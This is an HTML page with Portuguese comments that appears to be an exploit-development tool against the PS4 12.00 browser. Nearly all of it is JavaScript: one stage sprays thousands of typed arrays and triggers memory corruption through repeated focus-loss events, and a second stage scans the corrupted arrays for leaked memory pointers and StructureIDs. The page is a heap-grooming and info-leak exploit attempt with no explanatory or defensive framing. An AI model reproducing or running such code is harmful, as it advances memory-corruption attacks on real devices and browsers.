<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Precision Deep Scan</title>
<style>
    body { font-family: sans-serif; background: #f0f0f0; color: #333; padding: 20px; }
    button { padding: 12px 24px; margin: 5px; cursor: pointer; font-weight: bold; }
    code { background: #e0e0e0; padding: 2px 4px; border-radius: 4px; font-family: monospace; display: block; white-space: pre-wrap; margin: 5px 0; }
    .vuln { color: #d00; font-weight: bold; }
    .pointer { color: #ffffff; background: #0077ff; padding: 2px 4px; font-weight: bold; border-radius: 3px; }
    .metadata { color: #ffffff; background: #00aa00; padding: 2px 4px; font-weight: bold; border-radius: 3px; }
    hr { border: 0; border-top: 1px solid #ccc; margin: 30px 0; }
</style>
</head>
<body>

<h1>PS4 12.00 - PRECISION DEEP SCAN</h1>

<h2>STAGE 1: Setup & Massive Corruption</h2>
<p>Dobra a área de busca para 1000 objetos por tipo.</p>
<button onclick="setup()">1. CREATE 10,000 ARRAYS</button>
<div id="setup_log"></div>

<script>
var g_arrays = {
    Float64: [], Float32: [], BigUint64: [], BigInt64: [],
    Uint32: [], Int32: [], Uint16: [], Int16: [],
    Uint8: [], Int8: []
};

function setup() {
    const r = document.getElementById('setup_log');
    r.innerHTML = 'Creating arrays (1000 per type)...<br>';
    
    // Aumento para 1000 para forçar colisão com objetos do sistema
    for(let i = 0; i < 1000; i++) {
        g_arrays.Float64.push(new Float64Array(8));
        g_arrays.Float32.push(new Float32Array(8));
        g_arrays.BigUint64.push(new BigUint64Array(8));
        g_arrays.BigInt64.push(new BigInt64Array(8));
        g_arrays.Uint32.push(new Uint32Array(16));
        g_arrays.Int32.push(new Int32Array(16));
        g_arrays.Uint16.push(new Uint16Array(32));
        g_arrays.Int16.push(new Int16Array(32));
        g_arrays.Uint8.push(new Uint8Array(64));
        g_arrays.Int8.push(new Int8Array(64));

        for (let type in g_arrays) {
            let a = g_arrays[type][i];
            if (type.includes('Big')) a[0] = BigInt(i);
            else a[0] = i;
        }
    }
    
    r.innerHTML += '<b>Pronto. Entre em Full Screen e pressione OPTIONS duas vezes.</b><br>';
    if(document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
    
    let triggerCount = 0;
    window.onblur = function() {
        triggerCount++;
        r.innerHTML += '<br>Trigger ' + triggerCount + '... ';
        
        // Spray balanceado (4000) para não apagar vazamentos
        const P = 2.121995791e-314; 
        const spray = [];
        for(let i = 0; i < 4000; i++) {
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        if(triggerCount === 2) {
            r.innerHTML += '<b>CORRUPÇÃO FINALIZADA!</b><br>';
            check_status();
            window.onblur = null;
        }
    };
}

function check_status() {
    const r = document.getElementById('setup_log');
    for(let type in g_arrays) {
        let corrupted = g_arrays[type].filter((a, idx) => {
            if(type.includes('Big')) return a[0] !== BigInt(idx);
            return a[0] !== idx;
        });
        if(corrupted.length > 0) {
            r.innerHTML += `<span class="vuln">✓ ${type}Array: ${corrupted.length} corrompidos.</span><br>`;
        }
    }
}
</script>

<hr>

<h2>STAGE 2: Precision Memory Scan</h2>
<p>Filtra o "ruído" dos números Doubles (0x3ff/0x40) para encontrar ponteiros reais.</p>
<button onclick="precision_scan()">2. RUN PRECISION SCAN</button>
<div id="scan_log"></div>

<script>
function precision_scan() {
    const r = document.getElementById('scan_log');
    r.innerHTML = '<b>Varrendo memória em busca de ponteiros 0x7f e StructureIDs...</b><br>';

    let real_leaks = 0;
    const P_HEX = "4141414141414141";

    for (let type in g_arrays) {
        g_arrays[type].forEach((arr, idx) => {
            let view = new BigUint64Array(arr.buffer, 0, 1);
            let val = view[0];
            let hex = val.toString(16).padStart(16, '0');

            // FILTRO DE PRECISÃO: Ignora zeros, spray P e padrões de Double IEEE-754
            let is_double_pattern = hex.startsWith("3ff") || hex.startsWith("40");
            let is_index = hex === BigInt(idx).toString(16).padStart(16, '0');
            
            if (val !== 0n && hex !== P_HEX && !is_double_pattern && !is_index) {
                real_leaks++;
                
                // Identifica Ponteiros Vivos (0x7f...)
                if (hex.startsWith("00007f") || hex.startsWith("7f")) {
                    r.innerHTML += `[${type} #${idx}] <span class="pointer"><b>!!! PONTEIRO REAL !!!: 0x${hex}</b></span><br>`;
                } 
                // Identifica StructureIDs (terminando em 25 ou 108)
                else if (hex.endsWith("25") || hex.endsWith("108")) {
                    r.innerHTML += `[${type} #${idx}] <span class="metadata"><b>STRUCTUREID: 0x${hex}</b></span><br>`;
                } else {
                    r.innerHTML += `[${type} #${idx}] <b>DADO ESTRANHO:</b> 0x${hex}<br>`;
                }
            }
        });
    }

    if (real_leaks === 0) {
        r.innerHTML += "Nenhum ponteiro real encontrado. Tente rodar o setup novamente para novo alinhamento.<br>";
    } else {
        r.innerHTML += `<br><b>Sucesso: ${real_leaks} vazamentos reais identificados!</b>`;
    }
}
</script>

</body>
</html>
